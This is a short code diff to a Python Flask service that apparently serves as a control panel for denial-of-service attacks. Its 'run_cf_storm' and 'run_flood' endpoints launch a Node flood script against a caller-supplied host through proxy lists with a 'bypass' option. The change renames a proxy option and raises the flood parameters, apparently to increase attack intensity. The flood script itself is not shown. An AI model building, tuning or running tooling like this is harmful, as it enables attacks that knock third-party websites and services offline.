@@ -6,7 +6,7 @@ app = Flask(__name__)
 
 PROXY_MAP = {
     "vn": ("y", "vn.txt"),
-    "global": ("n", "prx.txt")
+    "all": ("n", "prx.txt")
 }
 
 def get_proxy_file(proxy_key):
@@ -47,7 +47,7 @@ def run_cf_storm():
 
     prx_flag, proxy_file = get_proxy_file(proxy_key)
     if not proxy_file:
-        return jsonify({"error": "Invalid proxy, must be 'vn' or 'global'"}), 400
+        return jsonify({"error": "Invalid proxy, must be 'vn' or 'all'"}), 400
 
     ok, err = run_prx_script(prx_flag)
     if not ok:
@@ -83,7 +83,7 @@ def run_flood():
     if not os.path.exists(proxy_file):
         return jsonify({"error": f"Proxy file not found: {proxy_file}"}), 500
 
-    cmd = ["node", "flood.txt", host, time_param, "65", "5", proxy_file, "bypass"]
+    cmd = ["node", "flood.txt", host, time_param, "90", "25", proxy_file, "bypass"]
     ok, err = start_background_node(cmd)
     if not ok:
         return jsonify({"error": f"Error running flood.txt: {err}"}), 500
